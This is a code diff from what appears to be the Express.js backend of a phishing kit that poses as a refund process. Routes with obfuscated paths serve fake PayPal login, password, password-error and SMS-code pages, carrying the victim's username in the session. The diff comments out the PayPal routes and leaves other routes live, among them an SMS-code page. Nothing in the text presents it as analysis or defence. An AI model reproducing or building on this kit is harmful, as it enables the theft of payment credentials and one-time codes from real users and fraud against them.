@@ -3529,29 +3529,29 @@ app.get("/LkaaomeM9HwWU472fgsPr", (req, res) => { // loading 3:
   res.render("done", { refundAmount });
 });
 
-app.get("/blaTxmdM9HwCP472fgsut", (req, res) => { // payment method selection
-  res.render("method");
-});
+// app.get("/blaTxmdM9HwCP472fgsut", (req, res) => { // payment method selection
+//   res.render("method");
+// });
 
 
-// paypal
-app.get("/loadingpp", (req, res) => { // loading 1: paypal
-  const { time, url } = req.query;
-  res.render("loadpaypo", { url, time });
-});
+// // paypal
+// app.get("/loadinghpp", (req, res) => { // loading 1: paypal
+//   const { time, url } = req.query;
+//   res.render("loadpaypo", { url, time });
+// });
 
-app.get("/HlX3xzdM2SwoPR72Fg5JL", (req, res) => { // login : paypal
-  res.render("logipaypo");
-});
-app.get("/XTk4xzRM2swNZP73Ug5BP", (req, res) => { // PASS : paypal
-  res.render("pasopaypo",{ user: req.session.paypaluser });
-});
-app.get("/VrC4xzeE2sw4ZB73xA5BI", (req, res) => { // PASS : err paypal
-  res.render("pasoerrpaypo",{ user: req.session.paypaluser });
-});
-app.get("/SoZ4opAM7PZIBpY0Ua7tV", (req, res) => { // SMS : paypal
-  res.render("simopaypo");
-});
+// app.get("/HlX3xzdM2SwoPR72Fg5JL", (req, res) => { // login : paypal
+//   res.render("logipaypo");
+// });
+// app.get("/XTk4xzRM2swNZP73Ug5BP", (req, res) => { // PASS : paypal
+//   res.render("pasopaypo",{ user: req.session.paypaluser });
+// });
+// app.get("/VrC4xzeE2sw4ZB73xA5BI", (req, res) => { // PASS : err paypal
+//   res.render("pasoerrpaypo",{ user: req.session.paypaluser });
+// });
+// app.get("/SoZ4opAM7PZIBpY0Ua7tV", (req, res) => { // SMS : paypal
+//   res.render("simopaypo");
+// });
 
 app.get("/CoR4opAT7PZu4op0UF7Po", (req, res) => { // SMS : paypal
   res.render("simopaypo2");
